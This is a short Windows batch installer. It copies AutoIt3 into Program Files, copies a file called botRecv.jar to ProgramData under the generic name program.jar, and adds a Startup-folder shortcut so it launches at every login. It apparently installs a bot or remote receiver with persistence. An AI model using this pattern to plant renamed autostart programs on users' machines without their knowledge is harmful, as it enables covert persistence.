SET recieveDir=C:\ProgramData\recieve
SET usedProgramFiles=C:\Program Files (x86)
SET usedStartupFolder=%HOMEDRIVE%%HOMEPATH%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

REM >xp:  SET usedStartupFolder=%HOMEDRIVE%%HOMEPATH%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
REM <=xp: SET usedStartupFolder=%HOMEDRIVE%%HOMEPATH%\Start Menu\Programs\Startup

mkdir "%recieveDir%"

echo D | xcopy "%~dp0\AutoIt3" "%usedProgramFiles%\AutoIt3" /s/h/e/k/f/c 1>nul
cscript "%~dp0\link.vbs" "%recieveDir%\Autoit3.lnk" "%usedProgramFiles%\AutoIt3\AutoIt3.exe"

copy "%~dp0\botRecv.jar" "%recieveDir%\program.jar"
cscript "%~dp0\link.vbs" "%usedStartupFolder%\program.lnk" "%recieveDir%\program.jar" "%recieveDir%"
